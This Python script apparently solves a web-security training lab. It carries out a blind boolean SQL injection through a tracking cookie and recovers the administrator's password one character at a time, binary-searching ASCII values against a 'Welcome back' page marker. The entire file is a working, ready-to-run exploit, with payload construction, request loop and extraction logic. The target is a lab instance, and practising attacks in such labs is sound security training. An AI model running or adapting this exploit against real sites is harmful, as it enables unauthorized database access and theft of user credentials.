#!/home/student/scripts/.dev/bin/activate/python3

import requests

# ------------------------------- config ------------------------------------
sessionCookie = "79wlUaOTbu2z21Ri1mXnyhoIFkt9NoeZ"
trackingCookie = "0aORXOyTE8n1kikR"
baseURL = "https://0a7a001403b166c483c5550900a00056.web-security-academy.net"
uri = "/"  # the store home page is where "Welcome back" renders
url = baseURL + uri
oracle = "Welcome back"

SUBQUERY = "SELECT password FROM users WHERE username='administrator'"
MAX_LEN = 20
# ---------------------------------------------------------------------------


def send_request(payload):
    """Append the SQL payload to the tracking cookie and send one request."""
    injected = trackingCookie + payload
    r = requests.get(
        url,
        cookies={"TrackingId": injected, "session": sessionCookie},
    )
    return r.text


def check_oracle(response):
    """True when the condition was true (page shows the oracle marker)."""
    return oracle in response


def test_condition(condition):
    """Wrap a SQL boolean condition in the injection and return the oracle result."""
    payload = f"' AND {condition}--"
    return check_oracle(send_request(payload))


def char_exists(pos):
    # ASCII('') is 0, so this goes false once we run past the last character.
    return test_condition(f"ASCII(SUBSTRING(({SUBQUERY}),{pos},1))>0")


def get_char(pos):
    """Binary-search (the 'narrow' step) for the character at 1-indexed pos."""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if test_condition(f"ASCII(SUBSTRING(({SUBQUERY}),{pos},1))>{mid}"):
            lo = mid + 1  # true value is higher than mid
        else:
            hi = mid  # true value is mid or lower
    return chr(lo)


def store_value():
    """Walk each position, stop at end of string, build up the password."""
    recovered = ""
    for pos in range(1, MAX_LEN + 1):
        if not char_exists(pos):
            print(f"[*] end of string at position {pos}")
            break
        c = get_char(pos)
        recovered += c
        print(f"[+] pos {pos:2d} = {c!r}  ->  {recovered}")
    return recovered


if __name__ == "__main__":
    print("[*] recovered password:", store_value())
